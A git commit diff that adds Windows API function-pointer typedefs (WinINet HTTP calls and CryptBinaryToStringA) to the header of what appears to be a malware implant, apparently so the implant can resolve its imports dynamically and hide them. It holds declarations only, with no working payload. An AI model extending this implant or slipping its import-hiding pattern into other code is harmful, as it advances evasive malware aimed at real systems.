28b7f8ba1333b81d136697c6731efe9a9093adef
Real-Cryillic <cunningham.dom@outlook.com>
2022-11-12 23:52:36 -0500

    Update dynamic linking functions

--- sarla/implant/src/imports.h
+++ sarla/implant/src/imports.h
@@ -13,3 +13,74 @@ typedef BOOL (WINAPI* GETUSERNAMEA)(
 typedef DWORD (WINAPI* GETCURRENTPROCESSID)();
 
 typedef DWORD (WINAPI* GETVERSION)();
+
+typedef HINTERNET (WINAPI* INTERNETOPENA)(
+  LPCSTR lpszAgent,
+  DWORD  dwAccessType,
+  LPCSTR lpszProxy,
+  LPCSTR lpszProxyBypass,
+  DWORD  dwFlags
+);
+
+typedef HINTERNET (WINAPI* INTERNETCONNECTA)(
+    HINTERNET     hInternet,
+    LPCSTR        lpszServerName,
+    INTERNET_PORT nServerPort,
+    LPCSTR        lpszUserName,
+    LPCSTR        lpszPassword,
+    DWORD         dwService,
+    DWORD         dwFlags,
+    DWORD_PTR     dwContext
+);
+
+typedef HINTERNET (WINAPI* HTTPOPENREQUESTA)(
+    HINTERNET hConnect,
+    LPCSTR    lpszVerb,
+    LPCSTR    lpszObjectName,
+    LPCSTR    lpszVersion,
+    LPCSTR    lpszReferrer,
+    LPCSTR    *lplpszAcceptTypes,
+    DWORD     dwFlags,
+    DWORD_PTR dwContext
+);
+
+typedef BOOL (WINAPI* HTTPADDREQUESTHEADERSA)(
+    HINTERNET hRequest,
+    LPCSTR    lpszHeaders,
+    DWORD     dwHeadersLength,
+    DWORD     dwModifiers
+);
+
+typedef BOOL (WINAPI* HTTPSENDREQUESTA)(
+    HINTERNET hRequest,
+    LPCSTR    lpszHeaders,
+    DWORD     dwHeadersLength,
+    LPVOID    lpOptional,
+    DWORD     dwOptionalLength
+);
+
+typedef BOOL (WINAPI* INTERNETQUERYDATAAVAILABLE)(
+    HINTERNET hFile,
+    LPDWORD   lpdwNumberOfBytesAvailable,
+    DWORD     dwFlags,
+    DWORD_PTR dwContext
+);
+
+typedef BOOL (WINAPI* INTERNETREADFILE)(
+    HINTERNET hFile,
+    LPVOID    lpBuffer,
+    DWORD     dwNumberOfBytesToRead,
+    LPDWORD   lpdwNumberOfBytesRead
+);
+
+typedef BOOL (WINAPI* INTERNETCLOSEHANDLE)(
+    HINTERNET hInternet
+);
+
+typedef BOOL (WINAPI* CRYPTBINARYTOSTRINGA)(
+    const BYTE *pbBinary,
+    DWORD      cbBinary,
+    DWORD      dwFlags,
+    LPSTR      pszString, 
+    DWORD      *pcchString
+);
